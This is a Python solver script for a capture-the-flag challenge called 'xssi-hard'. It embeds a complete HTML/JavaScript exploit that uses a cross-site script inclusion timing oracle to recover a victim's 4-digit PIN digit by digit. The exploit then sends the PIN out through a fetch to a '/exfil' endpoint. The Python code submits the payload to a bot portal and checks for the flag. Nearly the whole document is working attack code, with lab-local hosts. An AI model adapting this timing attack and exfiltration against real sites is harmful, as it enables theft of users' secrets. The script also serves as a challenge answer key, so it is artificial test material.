#!/usr/bin/env python3
"""
Automated solver / test verification script for xssi-hard (Hardened)
"""
import sys
import time
import requests

PORTAL_URL = "http://127.0.0.1:8000"

EXPLOIT_PAYLOAD = """<!DOCTYPE html>
<html>
<head>
  <title>XSSI Hard Solver</title>
</head>
<body>
  <h1>JSON Syntax Error Timing Oracle Exploit</h1>
  <div id="log">Running...</div>
  <script>
    const jobId = new URLSearchParams(window.location.search).get('jobId');

    function probe(prefix) {
      return new Promise((resolve) => {
        const t0 = performance.now();
        const script = document.createElement('script');

        let resolved = false;
        const done = () => {
          if (resolved) return;
          resolved = true;
          window.removeEventListener('error', onError);
          const duration = performance.now() - t0;
          script.remove();
          resolve(duration);
        };

        const onError = (e) => {
          done();
        };

        window.addEventListener('error', onError);
        script.onload = done;
        script.onerror = done;

        // Fallback timeout
        setTimeout(done, 500);

        script.src = 'http://victim.ctf:3000/api/search?prefix=' + encodeURIComponent(prefix);
        document.body.appendChild(script);
      });
    }

    async function runExploit() {
      const log = document.getElementById('log');
      let recoveredPin = '';

      // Reconstruct 4-digit PIN (1000 - 9999)
      for (let pos = 0; pos < 4; pos++) {
        let bestDigit = null;
        let maxTime = -1;

        const startDigit = (pos === 0) ? 1 : 0;
        for (let d = startDigit; d <= 9; d++) {
          const candidate = recoveredPin + d;
          const duration = await probe(candidate);
          console.log(`[Probe] ${candidate} -> ${duration.toFixed(1)}ms`);

          if (duration > 70) {
            bestDigit = String(d);
            maxTime = duration;
            break;
          }
          if (duration > maxTime) {
            maxTime = duration;
            bestDigit = String(d);
          }
        }

        recoveredPin += bestDigit;
        console.log(`[Exploit] Progress: ${recoveredPin}`);
        log.textContent = `Progress: ${recoveredPin}`;
      }

      console.log('[Exploit] Final PIN recovered:', recoveredPin);
      log.textContent = `Recovered PIN: ${recoveredPin}. Exfiltrating...`;

      // Exfiltrate recovered PIN with bound jobId
      await fetch('http://portal.ctf:8000/exfil?jobId=' + encodeURIComponent(jobId) + '&pin=' + encodeURIComponent(recoveredPin));
    }

    window.addEventListener('DOMContentLoaded', runExploit);
  </script>
</body>
</html>
"""

def main():
    print(f"[*] Connecting to challenge portal at {PORTAL_URL}...")
    try:
        res = requests.post(
            f"{PORTAL_URL}/submit",
            json={"html": EXPLOIT_PAYLOAD},
            timeout=10
        )
        res.raise_for_status()
        data = res.json()
    except Exception as e:
        print(f"[-] Failed to submit exploit payload: {e}")
        sys.exit(1)

    job_id = data.get("jobId")
    print(f"[+] Exploit submitted successfully. Job ID: {job_id}")
    print("[*] Waiting for bot execution and timing differential attack...")

    flag = None
    start_time = time.time()
    while time.time() - start_time < 25:
        time.sleep(1)
        try:
            status_res = requests.get(f"{PORTAL_URL}/status/{job_id}", timeout=5)
            status_data = status_res.json()
            if status_data.get("flag"):
                flag = status_data["flag"]
                break
            if status_data.get("status") == "completed" and not status_data.get("flag"):
                print("[-] Bot finished without successful flag release.")
                break
        except Exception as e:
            print(f"[!] Polling error: {e}")

    if flag:
        print(f"\n[+] SUCCESS! Captured flag: {flag}\n")
        assert flag.startswith("CTF{")
        sys.exit(0)
    else:
        print("[-] Exploit failed to recover the flag.")
        sys.exit(1)

if __name__ == "__main__":
    main()
